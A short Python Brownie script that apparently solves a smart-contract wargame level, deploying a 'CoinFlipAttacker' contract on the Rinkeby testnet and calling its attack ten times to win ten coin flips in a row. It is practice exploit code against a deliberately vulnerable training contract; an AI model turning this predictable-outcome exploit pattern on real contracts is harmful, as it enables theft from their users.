from brownie import accounts, CoinFlip, CoinFlipAttacker
import time

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0xF797c95EAaf47e507105d3F555753387999fabF4"
coin_flip = CoinFlip.at(instance_address)

# -----------------------------------------------------------
# to complete this level we need to guess the correct outcome
# 10 times in a row
# -----------------------------------------------------------


def level_completed():
    return coin_flip.consecutiveWins() >= 10


def exploit():
    # deploy attack contract
    hacker = CoinFlipAttacker.deploy(instance_address, {"from": account})

    # check how many consecutive wins we have: 0 so far
    print(coin_flip.consecutiveWins())

    # call attack function in hacker contract 10 times
    for i in range(10):
        tx = hacker.attack({"from": account, "gas_limit": 1e6, "allow_revert": True})
        tx.wait(1)
        time.sleep(10)

    # confirm that we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
